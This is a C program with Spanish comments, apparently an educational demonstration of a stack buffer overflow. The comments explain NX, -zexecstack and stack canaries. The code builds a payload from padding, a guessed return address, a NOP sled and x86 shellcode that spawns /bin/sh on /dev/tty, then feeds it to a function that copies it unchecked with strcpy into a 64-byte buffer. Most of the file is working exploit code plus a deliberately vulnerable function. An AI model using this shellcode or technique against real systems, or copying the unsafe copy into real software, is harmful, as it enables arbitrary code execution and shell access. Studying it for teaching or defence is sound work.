#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#pragma warning(disable : 4996)

/*
Podemos conseguir ejecutar código en el stack compilando el programa con la opción -zexecstack
En las arquitecturas modernas se utiliza una marca, NX, para indicar que segmentos no son ejecutables. Cuando el microprocesador trata de ejecutar código desde un segmento/página que tiene este marca, lanzará un error de violación de segmento. Con la opción - zexecstack lo que hacemos es desmarcar esta marca en la stack, de forma que si será posible ejecutar código en el stack

En el heap siempre estará la marca NX, de modo que no es posible ejecutar código desde el heap

La opción de gcc -fno-stack-protector lo que hace es quitar la protección de buffer overflow de la stack. gcc incluye unas variables de tipo "canary" en la stack para detectar si ha habido algun buffer overflow. Si queremos deshabilitar estos canaries, hay que usar esta opción al compilar.
*/ 

void imprime(char* mensaje);

int main(int argc, char **argv)
{
    
    int offset=4 
        , pad = 76 //tamaño del buffer de la función + 4 
        , rep = 1, 
        nop = 100, 
        code;
    char *explota;
    char * eip;
    unsigned int address;
    char *shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    code = strlen(shellcode);
    explota = malloc(pad + sizeof(eip)*rep + nop + code);
    
    //Donde esta nop, un un poco más adelante
    if (argc > 1) {
        offset = atoi(argv[1]);
    }

    /*
    explota es un puntero a la heap.
    
    los datos que coloquemos en este puntero se usaran para hacer el buffer overflow

    Colocaremos lo siguiente:
    - padding. No hace nada, solo sirve de relleno
    - direccion del código a ejecutar. Esta posición tiene que coincidir con el EIP. Tiene que apuntar al código que vamos a incluir - ver siguiente punto. Tiene que apuntar a cualquiera de las instrucciones NOP del código
    - código. El código seran instrucciones NOP seguidas del código que queremos inyectar

    PAD deberá quedar por encima del EIP
    Alguna de las direcciones que informamos como EIP deberá sobre-escribir la direccion de retorno de la pila. 
    La dirección deberá apuntar a la zona donde guardamos NOP
    NOP y el código se 
    PAD
    */

    //PAD
    memset(explota, 0x41, pad);
    //EIP
    eip = &offset - offset;
    address = (unsigned int)eip;
    for (int i = 0; i < rep; i++)
    {
        memcpy(&explota[pad + i * sizeof(address)], &address, sizeof(address));
    }
    //NOP
    memset(explota + pad + sizeof(address) * rep, 0x90, nop);
    //Codigo
    memcpy(explota + pad + sizeof(address) * rep + nop, shellcode, code);

    imprime(explota);
}

void imprime(char * mensaje){
    char buffer[64];
    strcpy(buffer, mensaje);
    printf("Mensaje: %s\n",buffer);
    return;
}
